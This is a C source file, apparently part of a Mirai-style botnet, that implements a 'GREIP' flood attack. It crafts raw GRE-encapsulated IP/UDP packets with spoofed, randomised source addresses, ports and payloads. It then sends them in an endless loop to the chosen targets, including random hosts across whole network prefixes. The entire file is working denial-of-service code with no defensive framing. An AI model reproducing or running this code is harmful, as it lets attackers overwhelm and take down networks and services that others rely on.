#define _GNU_SOURCE

#include "../../attack.h"

void flood_greip(struct flood *flood)
{
    int i, fd;
    char **pkts = calloc(flood->num_of_targets, sizeof(char *));
    flood->settings->dont_fragment = get_option_number(flood->num_of_options, flood->options, OPT_IP_DF, 1);

    if ((fd = sys_socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
        debug("Failed to create raw socket. Aborting attack\n");
        return;
    }
    i = 1;
    if (sys_setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof(int)) == -1)
    {
        debug("Failed to set IP_HDRINCL. Aborting\n");
        sys_close(fd);
        return;
    }

    for (i = 0; i < flood->num_of_targets; i++)
    {
        struct iphdr *iph;
        struct grehdr *greh;
        struct iphdr *greiph;
        struct udphdr *udph;

        pkts[i] = calloc(1510, sizeof(char *));
        iph = (struct iphdr *)(pkts[i]);
        greh = (struct grehdr *)(iph + 1);
        greiph = (struct iphdr *)(greh + 1);
        udph = (struct udphdr *)(greiph + 1);

        // IP header init
        iph->version_ihl = (4 << 4) | 5;
        iph->tos = flood->settings->tos;
        iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct grehdr) + sizeof(struct iphdr) + sizeof(struct udphdr) + flood->settings->length);
        iph->id = htons(flood->settings->ident);
        iph->ttl = flood->settings->ttl;
        if (flood->settings->dont_fragment)
            iph->frag_off = htons(1 << 14);
        iph->protocol = IPPROTO_GRE;
        iph->saddr = flood->settings->source_ip;
        iph->daddr = flood->targets[i].addr;

        // GRE header init
        greh->protocol = htons(ETH_P_IP); // Protocol is 2 bytes

        // Encapsulated IP header init
        greiph->version_ihl = (4 << 4) | 5;
        greiph->tos = flood->settings->tos;
        greiph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + flood->settings->length);
        greiph->id = htons(~flood->settings->ident);
        greiph->ttl = flood->settings->ttl;
        if (flood->settings->dont_fragment)
            greiph->frag_off = htons(1 << 14);
        greiph->protocol = IPPROTO_UDP;
        greiph->saddr = rand_next();
        if (flood->settings->const_ip)
            greiph->daddr = iph->daddr;
        else
            greiph->daddr = ~(greiph->saddr - 1024);

        // UDP header init
        udph->source = htons(flood->settings->source_port);
        udph->dest = htons(flood->settings->dest_port);
        udph->len = htons(sizeof(struct udphdr) + flood->settings->length);
    }

    while (*flood->running)
    {
        for (i = 0; i < flood->num_of_targets; i++)
        {
            char *pkt = pkts[i];
            struct iphdr *iph = (struct iphdr *)pkt;
            struct grehdr *greh = (struct grehdr *)(iph + 1);
            struct iphdr *greiph = (struct iphdr *)(greh + 1);
            struct udphdr *udph = (struct udphdr *)(greiph + 1);
            char *data = (char *)(udph + 1);

            // For prefix attacks
            if (flood->targets[i].netmask < 32)
                iph->daddr = htonl(ntohl(flood->targets[i].addr) + (((uint32_t)rand_next()) >> flood->targets[i].netmask));

            if (flood->settings->source_ip == 0xffffffff)
                iph->saddr = rand_next();

            if (flood->settings->ident == 0xffff)
            {
                iph->id = rand_next() & 0xffff;
                greiph->id = ~(iph->id - 1000);
            }

            if (flood->settings->source_port == 0xffff)
                udph->source = rand_next() & 0xffff;

            if (flood->settings->dest_port == 0xffff)
                udph->dest = rand_next() & 0xffff;

            if (!flood->settings->const_ip)
                greiph->daddr = rand_next();
            else
                greiph->daddr = iph->daddr;

            if (flood->settings->min_length > 0 && flood->settings->max_length > 0)
                flood->settings->length = rand_next_range(flood->settings->min_length, flood->settings->max_length);

            rand_str(data, flood->settings->length);

            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));

            greiph->check = 0;
            greiph->check = checksum_generic((uint16_t *)greiph, sizeof(struct iphdr));

            udph->check = 0;
            udph->check = checksum_tcpudp((uint8_t *)greiph, sizeof(struct iphdr) + sizeof(struct udphdr) + flood->settings->length, (uint8_t *)&greiph->saddr, (uint8_t *)&greiph->daddr);

            flood->targets[i].sock_addr.sin_family = AF_INET;
            flood->targets[i].sock_addr.sin_addr.s_addr = iph->daddr;
            flood->targets[i].sock_addr.sin_port = 0;
            sys_sendto(fd, pkt, sizeof(struct iphdr) + sizeof(struct grehdr) + sizeof(struct iphdr) + sizeof(struct udphdr) + flood->settings->length, MSG_NOSIGNAL, (void *)&flood->targets[i].sock_addr, sizeof(struct sockaddr_in));
        }

        if (flood->settings->sleep > 0)
            sys_usleep(flood->settings->sleep * 1000);

        debug("errno = %d\n", errno);
    }
}
